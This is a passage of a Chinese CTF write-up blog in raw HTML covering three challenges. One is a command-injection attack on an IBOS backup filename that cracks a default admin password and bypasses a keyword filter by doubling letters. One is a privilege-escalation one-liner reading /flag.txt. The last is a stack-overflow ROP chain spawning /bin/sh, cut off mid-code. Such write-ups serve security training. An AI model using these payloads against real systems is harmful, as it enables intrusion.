string">'&#123;\"uid\":\"1\",\"username\":\"admin\",\"isadministrator\":\"1\",\"deptid\":\"0\",\"positionid\":\"0\",\"roleid\":\"0\",\"upuid\":\"0\",\"groupid\":\"0\",\"jobnumber\":\"\",\"realname\":\"\\u8d85\\u7ea7\\u7ba1\\u7406\\u5458\",\"password\":\"bc3bc521c972d39d1e5748598987c77f\",\"gender\":\"1\",\"weixin\":\"\",\"mobile\":\"11111111111\",\"email\":\"\",\"status\":\"0\",\"createtime\":\"1735912196\",\"credits\":\"0\",\"newcomer\":\"1\",\"salt\":\"a8AZi8\",\"validationemail\":\"0\",\"validationmobile\":\"0\",\"lastchangepass\":\"0\",\"guid\":\"5BAACB4F-3651-E9B1-BADC-5CD9A7AAD9BD\",\"birthday\":\"0\",\"telephone\":\"\",\"address\":\"\",\"qq\":\"\",\"bio\":\"\",\"remindsetting\":\"\",\"avatar_big\":\"data\\/avatar\\/noavatar_big.jpg\",\"avatar_middle\":\"data\\/avatar\\/noavatar_middle.jpg\",\"avatar_small\":\"data\\/avatar\\/noavatar_small.jpg\",\"bg_big\":\"data\\/home\\/nobg_big.jpg\",\"bg_middle\":\"\",\"bg_small\":\"data\\/home\\/nobg_small.jpg\",\"group_title\":\"\",\"level\":1,\"upgrade_percent\":0,\"next_group_credit\":0,\"alldeptid\":\"0\",\"deptname\":\"\",\"posname\":\"\",\"allposid\":\"\",\"rolename\":\"\",\"allroleid\":\"\",\"space_url\":\"?r=user\\/home\\/index&amp;uid=1\"&#125;'</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>密码md5解不出来</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">INSERT</span> <span class="token keyword">INTO</span> <span class="token identifier"><span class="token punctuation">`</span>1234_user<span class="token punctuation">`</span></span> <span class="token keyword">VALUES</span> <span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token string">'admin'</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">,</span><span class="token string">'超级管理员'</span><span class="token punctuation">,</span><span class="token string">'bc3bc521c972d39d1e5748598987c77f'</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">,</span><span class="token string">'11111111111'</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1735912196</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token string">'a8AZi8'</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token string">'5BAACB4F-3651-E9B1-BADC-5CD9A7AAD9BD'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>搜一下找到加密逻辑，是两次<code>md5(md5($pass),$salt)</code></p><p><img src="/blog/2025/01/09/%E7%AC%AC%E5%85%AB%E5%B1%8A%E5%B7%A5%E4%B8%9A%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E5%A4%A7%E8%B5%9B%E5%A4%8D%E8%B5%9B/image-20250109113138639.png" alt="image-20250109113138639"></p><p>测出来密码是123456</p><p><img src="/blog/2025/01/09/%E7%AC%AC%E5%85%AB%E5%B1%8A%E5%B7%A5%E4%B8%9A%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E5%A4%A7%E8%B5%9B%E5%A4%8D%E8%B5%9B/image-20250109113251988.png" alt="image-20250109113251988"></p><p>原来是默认密码</p><p>然后就进后台了，接下来参考：<a href="https://xz.aliyun.com/t/9115">https://xz.aliyun.com/t/9115</a></p><p><img src="/blog/2025/01/09/%E7%AC%AC%E5%85%AB%E5%B1%8A%E5%B7%A5%E4%B8%9A%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E5%A4%A7%E8%B5%9B%E5%A4%8D%E8%B5%9B/image-20250109113955181.png" alt="image-20250109113955181"></p><p>抓包</p><p>漏洞点在：system\core\utils\Database.php</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token variable">$dumpFile</span> <span class="token operator">=</span> <span class="token function">addslashes</span><span class="token punctuation">(</span><span class="token constant">PATH_ROOT</span><span class="token punctuation">)</span> <span class="token operator">.</span> <span class="token string single-quoted-string">'/'</span> <span class="token operator">.</span> <span class="token variable">$backupFileName</span> <span class="token operator">.</span> <span class="token string single-quoted-string">'.sql'</span><span class="token punctuation">;</span>@<span class="token function">unlink</span><span class="token punctuation">(</span><span class="token variable">$dumpFile</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$mysqlBin</span> <span class="token operator">=</span> <span class="token variable">$mysqlBase</span> <span class="token operator">==</span> <span class="token string single-quoted-string">'/'</span> <span class="token operator">?</span> <span class="token string single-quoted-string">''</span> <span class="token punctuation">:</span> <span class="token function">addslashes</span><span class="token punctuation">(</span><span class="token variable">$mysqlBase</span><span class="token punctuation">)</span> <span class="token operator">.</span> <span class="token string single-quoted-string">'bin/'</span><span class="token punctuation">;</span><span class="token variable">$command1</span> <span class="token operator">=</span> <span class="token variable">$dbVersion</span> <span class="token operator">></span> <span class="token string single-quoted-string">'4.1'</span> <span class="token operator">?</span> <span class="token string single-quoted-string">'--skip-opt --create-options'</span> <span class="token punctuation">:</span> <span class="token string single-quoted-string">'-all'</span><span class="token punctuation">;</span><span class="token variable">$command2</span> <span class="token operator">=</span> <span class="token class-name static-context">Env</span><span class="token operator">::</span><span class="token function">getRequest</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'extendins'</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">1</span> <span class="token operator">?</span> <span class="token string single-quoted-string">'--extended-insert'</span> <span class="token punctuation">:</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">;</span><span class="token variable">$command3</span> <span class="token operator">=</span> <span class="token variable">$dbVersion</span> <span class="token operator">></span> <span class="token string single-quoted-string">'4.1'</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$sqlCompat</span> <span class="token operator">==</span> <span class="token string single-quoted-string">'MYSQL40'</span> <span class="token operator">?</span> <span class="token string single-quoted-string">'--compatible=mysql40'</span> <span class="token punctuation">:</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">;</span><span class="token variable">$command4</span> <span class="token operator">=</span> <span class="token function">is_numeric</span><span class="token punctuation">(</span><span class="token variable">$db</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'port'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token string double-quoted-string">"--port=\"<span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token variable">$db</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'port'</span><span class="token punctuation">]</span><span class="token punctuation">&#125;</span></span>\""</span> <span class="token punctuation">:</span> <span class="token string double-quoted-string">"--socket=\"<span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token variable">$db</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'port'</span><span class="token punctuation">]</span><span class="token punctuation">&#125;</span></span>\""</span><span class="token punctuation">;</span><span class="token variable">$command5</span> <span class="token operator">=</span> <span class="token variable">$db</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'port'</span><span class="token punctuation">]</span> <span class="token operator">?</span> <span class="token variable">$command4</span> <span class="token punctuation">:</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">;</span><span class="token comment">//这。。。是黑科技</span><span class="token string backtick-quoted-string">`&#123;$mysqlBin&#125;mysqldump --force --quick &#123;$command1&#125; --add-drop-table &#123;$command2&#125; &#123;$command3&#125; --host="&#123;$db['host']&#125;" &#123;$command5&#125; --user="&#123;$db['username']&#125;" --password="&#123;$db['password']&#125;" "&#123;$db['dbname']&#125;" &#123;$tablesstr&#125; > &#123;$dumpFile&#125;`</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>向上跟踪</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token comment">// --- 备份文件夹及备份文件名 ---</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">is_dir</span><span class="token punctuation">(</span><span class="token keyword static-context">self</span><span class="token operator">::</span><span class="token constant">BACKUP_DIR</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token class-name static-context">File</span><span class="token operator">::</span><span class="token function">makeDir</span><span class="token punctuation">(</span><span class="token keyword static-context">self</span><span class="token operator">::</span><span class="token constant">BACKUP_DIR</span><span class="token punctuation">,</span> <span class="token number">0777</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token variable">$backupFileName</span> <span class="token operator">=</span> <span class="token keyword static-context">self</span><span class="token operator">::</span><span class="token constant">BACKUP_DIR</span> <span class="token operator">.</span> <span class="token string single-quoted-string">'/'</span> <span class="token operator">.</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'\\'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'$'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'*'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'system'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'eval'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'cat'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'nl'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'head'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'tail'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'more'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'less'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'ls'</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">,</span> <span class="token variable">$fileName</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>filename这样ban，替换函数的话双写绕过即可</p><p>再往上看看</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token comment">// 检查导出名字</span><span class="token variable">$fileName</span> <span class="token operator">=</span> <span class="token class-name static-context">Env</span><span class="token operator">::</span><span class="token function">getRequest</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'filename'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$hasDangerFileName</span> <span class="token operator">=</span> <span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/(\.)(exe|jsp|asp|aspx|cgi|fcgi|pl)(\.|$)/i'</span><span class="token punctuation">,</span> <span class="token variable">$fileName</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$fileName</span> <span class="token operator">||</span> <span class="token punctuation">(</span><span class="token keyword type-casting">boolean</span><span class="token punctuation">)</span><span class="token variable">$hasDangerFileName</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">return</span> <span class="token keyword">array</span><span class="token punctuation">(</span>        <span class="token string single-quoted-string">'type'</span> <span class="token operator">=></span> <span class="token string single-quoted-string">'error'</span><span class="token punctuation">,</span>        <span class="token string single-quoted-string">'msg'</span> <span class="token operator">=></span> <span class="token class-name static-context">Ibos</span><span class="token operator">::</span><span class="token function">lang</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'Database export filename invalid'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'dashboard.default'</span><span class="token punctuation">)</span>    <span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这样ban的话写马太困难，但是依旧可以直接执行命令</p><p>构造payload：</p><pre class="line-numbers language-php" data-language="php"><code class="language-php">backuptype<span class="token operator">=</span>all<span class="token operator">&amp;</span>custom_enabled<span class="token operator">=</span><span class="token number">1</span><span class="token operator">&amp;</span>method<span class="token operator">=</span>shell<span class="token operator">&amp;</span>sizelimit<span class="token operator">=</span><span class="token number">2048</span><span class="token operator">&amp;</span>extendins<span class="token operator">=</span><span class="token number">0</span><span class="token operator">&amp;</span>sqlcompat<span class="token operator">=</span><span class="token constant">MYSQL41</span><span class="token operator">&amp;</span>sqlcharset<span class="token operator">=</span>utf8<span class="token operator">&amp;</span>usehex<span class="token operator">=</span><span class="token number">0</span><span class="token operator">&amp;</span>usezip<span class="token operator">=</span><span class="token number">0</span><span class="token operator">&amp;</span>filename<span class="token operator">=</span><span class="token number">2021</span><span class="token operator">%</span><span class="token number">26</span>cd <span class="token operator">.</span><span class="token operator">.</span><span class="token operator">%</span><span class="token number">26</span>cd <span class="token operator">.</span><span class="token operator">.</span><span class="token operator">%</span><span class="token number">26</span>cd <span class="token operator">.</span><span class="token operator">.</span><span class="token operator">%</span><span class="token number">26</span>cd <span class="token operator">.</span><span class="token operator">.</span><span class="token operator">%</span><span class="token number">26</span>llss<span class="token operator">></span><span class="token number">111</span><span class="token operator">%</span><span class="token number">262021</span><span class="token operator">&amp;</span>dbSubmit<span class="token operator">=</span><span class="token number">1</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/blog/2025/01/09/%E7%AC%AC%E5%85%AB%E5%B1%8A%E5%B7%A5%E4%B8%9A%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E5%A4%A7%E8%B5%9B%E5%A4%8D%E8%B5%9B/image-20250109114700372.png" alt="image-20250109114700372"></p><p>web根目录下访问可以带出回显内容</p><p><img src="/blog/2025/01/09/%E7%AC%AC%E5%85%AB%E5%B1%8A%E5%B7%A5%E4%B8%9A%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E5%A4%A7%E8%B5%9B%E5%A4%8D%E8%B5%9B/image-20250109140751067.png" alt="image-20250109140751067"></p><p>改成 <code>cacatt f12g.txt</code> 就能读取flag了</p><p><img src="/blog/2025/01/09/%E7%AC%AC%E5%85%AB%E5%B1%8A%E5%B7%A5%E4%B8%9A%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E5%A4%A7%E8%B5%9B%E5%A4%8D%E8%B5%9B/image-20250109141001775.png" alt="image-20250109141001775"></p><p>怎么 f12g.txt 就在web目录，这下知道前几血怎么做的了</p><hr><h2 id="web-国产业务系统隐患排查"><a href="#web-国产业务系统隐患排查" class="headerlink" title="web-国产业务系统隐患排查"></a>web-国产业务系统隐患排查</h2><p>流量包分析出后台密码</p><p>然后是一个蝉知7.7，getshell的方式在 NSS GKCTF2021 easycms 中亦有记载：<a href="https://c1oudfl0w0.github.io/blog/2023/10/16/NSSCTF-web-%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%951/#GKCTF-2021-easycms">https://c1oudfl0w0.github.io/blog/2023/10/16/NSSCTF-web-%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%951/#GKCTF-2021-easycms</a></p><p>简单提个权拿flag</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">python2.7 <span class="token parameter variable">-c</span> <span class="token string">'print(open(\"/flag.txt\").read())'</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/blog/2025/01/09/%E7%AC%AC%E5%85%AB%E5%B1%8A%E5%B7%A5%E4%B8%9A%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E5%A4%A7%E8%B5%9B%E5%A4%8D%E8%B5%9B/image-20250109112822712.png" alt="image-20250109112822712"></p><hr><h2 id="pwn-snake"><a href="#pwn-snake" class="headerlink" title="pwn-snake"></a>pwn-snake</h2><p>dword_6BD3F0 是分数</p><p><img src="/blog/2025/01/09/%E7%AC%AC%E5%85%AB%E5%B1%8A%E5%B7%A5%E4%B8%9A%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E5%A4%A7%E8%B5%9B%E5%A4%8D%E8%B5%9B/image-20250110114712153.png" alt="image-20250110114712153"></p><p>打2分输入q退出后进入 sub_401427</p><p><img src="/blog/2025/01/09/%E7%AC%AC%E5%85%AB%E5%B1%8A%E5%B7%A5%E4%B8%9A%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E5%A4%A7%E8%B5%9B%E5%A4%8D%E8%B5%9B/image-20250110114648914.png" alt="image-20250110114648914"></p><p>v1接收输入，那么这里v3存在栈溢出，偏移0x70+0x8</p><p>sub_40117D 是base64解码</p><p>于是用 ROPgadget 生成payload打栈溢出，加上偏移量后base64编码payload</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">ROPgadget <span class="token parameter variable">--binary</span> pwn <span class="token parameter variable">--ropchain</span> <span class="token operator">></span> exp.py<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>最终payload：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> base64 <span class="token keyword">import</span> b64encode<span class="token keyword">from</span> struct <span class="token keyword">import</span> pack<span class="token comment"># Padding goes here</span>p <span class="token operator">=</span> <span class="token string">b''</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x00000000004113f3</span><span class="token punctuation">)</span> <span class="token comment"># pop rsi ; ret</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x00000000006bb0e0</span><span class="token punctuation">)</span> <span class="token comment"># @ .data</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x00000000004005af</span><span class="token punctuation">)</span> <span class="token comment"># pop rax ; ret</span>p <span class="token operator">+=</span> <span class="token string">b'/bin//sh'</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000480bb1</span><span class="token punctuation">)</span> <span class="token comment"># mov qword ptr [rsi], rax ; ret</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x00000000004113f3</span><span class="token punctuation">)</span> <span class="token comment"># pop rsi ; ret</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x00000000006bb0e8</span><span class="token punctuation">)</span> <span class="token comment"># @ .data + 8</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x00000000004458a0</span><span class="token punctuation">)</span> <span class="token comment"># xor rax, rax ; ret</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000480bb1</span><span class="token punctuation">)</span> <span class="token comment"># mov qword ptr [rsi], rax ; ret</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x00000000004006a6</span><span class="token punctuation">)</span> <span class="token comment"># pop rdi ; ret</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x00000000006bb0e0</span><span class="token punctuation">)</span> <span class="token comment"># @ .data</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x00000000004113f3</span><span class="token punctuation">)</span> <span class="token comment"># pop rsi ; ret</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x00000000006bb0e8</span><span class="token punctuation">)</span> <span class="token comment"># @ .data + 8</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x000000000044cb86</span><span class="token punctuation">)</span> <span class="token comment"># pop rdx ; ret</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x00000000006bb0e8</span><span class="token punctuation">)</span> <span class="token comment"># @ .data + 8</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x00000000004458a0</span><span class="token punctuation">)</span> <span class="token comment"># xor rax, rax ; ret</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000475e30</span><span class="token punctuation">)</span> <span class="token comment"># add rax, 1 ; ret</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000475e30</span><span class="token punctuation">)</span> <span class="token comment"># add rax, 1 ; ret</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000475e30</span><span class="token punctuation">)</span> <span class="token comment"># add rax, 1 ; ret</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000475e30</span><span class="token punctuation">)</span> <span class="token comment"># add rax, 1 ; ret</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000475e30</span><span class="token punctuation">)</span> <span class="token comment"># add rax, 1 ; ret</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000475e30</span><span class="token punctuation">)</span> <span class="token comment"># add rax, 1 ; ret</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000475e30</span><span class="token punctuation">)</span> <span class="token comment"># add rax, 1 ; ret</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000475e30</span><span class="token punctuation">)</span> <span class="token comment"># add rax, 1 ; ret</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000475e30</span><span class="token punctuation">)</span> <span class="token comment"># add rax, 1 ; ret</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000475e30</span><span class="token punctuation">)</span> <span class="token comment"># add rax, 1 ; ret</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000475e30</span><span class="token punctuation">)</span> <span class="token comment"># add rax, 1 ; ret</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000475e30</span><span class="token punctuation">)</span> <span class="token comment"># add rax, 1 ; ret</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000475e30</span><span class="token punctuation">)</span> <span class="token comment"># add rax, 1 ; ret</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000475e30</span><span class="token punctuation">)</span> <span class="token comment"># add rax, 1 ; ret</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000475e30</span><span class="token punctuation">)</span> <span class="token comment"># add rax, 1 ; ret</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000475e30</span><span class="token punctuation">)</span> <span class="token comment"># add rax, 1 ; ret</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000475e30</span><span class="token punctuation">)</span> <span class="token comment"># add rax, 1 ; ret</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000475e30</span><span class="token punctuation">)</span> <span class="token comment"># add rax, 1 ; ret</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000475e30</span><span class="token punctuation">)</span> <span class="token comment"># add rax, 1 ; ret</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000475e30</span><span class="token punctuation">)</span> <span class="token comment"># add rax, 1 ; ret</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000475e30</span><span class="token punctuation">)</span> <span class="token comment"># add rax, 1 ; ret</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000475e30</span><span class="token punctuation">)</span> <span class="token comment"># add rax, 1 ; ret</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000475e30</span><span class="token punctuation">)</span> <span class="token comment"># add rax, 1 ; ret</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000475e30</span><span class="token punctuation">)</span> <span class="token comment"># add rax, 1 ; ret</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000475e30</span><span class="token punctuation">)</span> <span class="token comment"># add rax, 1 ; ret</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000475e30</span><span class="token punctuation">)</span> <span class="token comment"># add rax, 1 ; ret</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000475e30</span><span class="token punctuation">)</span> <span class="token comment"># add rax, 1 ; ret</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000475e30</span><span class="token punctuation">)</span> <span class="token comment"># add rax, 1 ; ret</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000475e30</span><span class="token punctuation">)</span> <span class="token comment"># add rax, 1 ; ret</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000475e30</span><span class="token punctuation">)</span> <span class="token comment"># add rax, 1 ; ret</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000475e30</span><span class="token punctuation">)</span> <span class="token comment"># add rax, 1 ; ret</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000475e30</span><span class="token punctuation">)</span> <span class="token comment"># add rax, 1 ; ret</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000475e30</span><span class="token punctuation">)</span> <span class="token comment"># add rax, 1 ; ret</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000475e30</span><span class="token punctuation">)</span> <span class="token comment"># add rax, 1 ; ret</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000475e30</span><span class="token punctuation">)</span> <span class="token comment"># add rax, 1 ; ret</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token 